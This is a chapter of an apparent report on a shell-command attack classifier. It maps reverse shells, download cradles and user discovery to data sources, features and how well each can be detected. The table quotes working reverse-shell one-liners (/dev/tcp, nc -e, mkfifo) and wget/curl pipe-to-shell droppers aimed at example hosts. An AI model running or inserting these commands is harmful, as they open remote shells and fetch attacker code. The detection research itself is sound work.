# Chapter 1 — Threat & Telemetry Mapping (my 3 rows)

Three MITRE ATT&CK sub-techniques observed in the dataset, mapped from shell telemetry to the source that captures them, to the engineered features (from `src/features.py` `FEATURE_NAMES`) that encode them, to whether a **provenance-labeled** classifier can detect them reliably. The three are chosen to span the detectability spectrum: one cleanly detectable, one detectable-but-confounded, one effectively undetectable by content. Detectability claims are grounded in the error forensics of [`report/ch8_findings.md`](ch8_findings.md) and the source descriptions in [`docs/DATA_CARD.md`](../docs/DATA_CARD.md).

| Sub-technique | How it appears in shell telemetry | Dataset source & how it is captured | Derived / Engineered Feature | Can a provenance-labeled classifier detect it reliably? |
|---|---|---|---|---|
| **T1059.004 — Command & Scripting Interpreter: Unix Shell** (reverse shells) | An interactive shell wired to a remote socket. Near-unique tokens: `bash -i >& /dev/tcp/10.0.0.5/4444 0>&1`; `nc -e /bin/sh 1.2.3.4 4444`; `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc <ip> <port> >/tmp/f`; `exec 3<>/dev/tcp/…; /bin/bash <&3 >&3 2>&3`. | `payloads` (PayloadsAllTheThings reverse-shell cheatsheet, lifted verbatim from markdown code blocks), `quasarnix` (synthetic reverse shells combinatorially generated from ~34 threat-intel templates), `slp` (pentest-resource corpus), and live `honeypot` (Cowrie `cowrie.command.input` events of attacker-typed shells). | `has_dev_tcp`, `has_shell_bin`, `n_redirects`, `has_fetch_bin`, `has_shell_flag_i`, `has_exec_flag` | **YES — reliably (the "easy" positives).** The signature tokens (`/dev/tcp`, `nc -e`, `mkfifo /tmp/f`) are essentially absent from every benign corpus, and the `has_dev_tcp`/`n_redirects`/`has_shell_bin` features fire hard. Forensics confirm it: **`quasarnix` 0/58 and `payloads` 0/15 false negatives** — both XGBoost-hybrid and the CNN catch every reverse shell. Caveat: reliability rides partly on the clean style of these sources; a heavily obfuscated variant (`awk`/`perl`/`socat`) could still slip past. |
| **T1105 — Ingress Tool Transfer** (curl/wget download cradles) | Fetch-and-execute pipelines: `wget http://185.22.11.9/x.sh -O- \| sh`; `curl http://evil.host/a \| bash`; `cd /tmp \|\| cd /dev/shm; wget <url>; chmod +x x; ./x`; `tftp -g -r bins <ip>`. Tells: `wget`/`curl`, a `\| sh` hand-off, a hard-coded IP/URL, `chmod +x`, `/tmp`·`/dev/shm` staging. | Dominantly `honeypot` (Cowrie): the botnet dropper chain is the single most common attacker input captured, logged whole as one `cowrie.command.input` line. Also present in `payloads` and `hacktricks` writeups. | `has_fetch_bin`, `has_url`, `has_ipv4`, `n_ipv4`, `n_pipes`, `has_privesc_bin` | **PARTIALLY — detectable in-domain, but confounded.** The fetch-then-shell pattern is distinctive (`has_fetch_bin`, `has_url`, `n_pipes`), but `curl`/`wget` are also everyday benign tools (`tldr`, `nl2bash`), so the provenance label conflates "download cradle" with "contains a URL/IP." The **IPv4-presence-only shortcut probe scored ROC-AUC 0.546** — a weak-but-real artifact the model can lean on. Because the honeypot's real-IP dropper style does not resemble curated benign data, this cue is register-specific and **does not transfer** (it is a prime contributor to the D2→D1 collapse). |
| **T1033 — System Owner/User Discovery** (whoami/id) | Bare enumeration with no distinctive syntax: `whoami`; `id`; `id -u`; and adjacent recon `uname -a`, `cat /etc/passwd`, `last \| tail`, `hostname`. A single legitimate binary, often argument-free. | `honeypot` (Cowrie): the first stage of nearly every botnet script is `whoami`/`id`/`uname` fingerprinting; and `hacktricks` enumeration pages. Provenance stamps these "attack" **only because of where they were captured**, not what they are. | `has_enum_bin`, `n_enum_bins`, `n_sensitive_paths` | **NO — not reliably.** These commands are byte-for-byte identical to routine administration, so there is no content signal to learn. A provenance classifier can only "detect" them by memorizing that they co-occur with a malicious source's *style* — i.e. label contamination, not intent. Forensics bear this out: the most-confident false negatives are exactly this recon class (`last \| tail`, `pkaction --verbose`, `declare historywords`), and the same `whoami`/`id` sitting in a real user's history would be a false positive. This is the clearest case where provenance labeling **cannot** yield reliable detection. |

**Takeaway.** Detectability under provenance labels tracks how much the technique *lexically distinguishes itself from benign administration*, not how dangerous it is. T1059.004 reverse shells carry their own unforgeable syntax and are caught perfectly; T1105 hides a real signal behind a URL/IP artifact that is genuine in-domain but non-transferable; T1033 discovery has no content signature at all and is "detected" only as a source-style artifact. A detector that reports high aggregate accuracy is therefore strong on the first class, brittle on the second, and effectively blind on the third — a distinction aggregate F1 hides but per-technique mapping makes explicit.
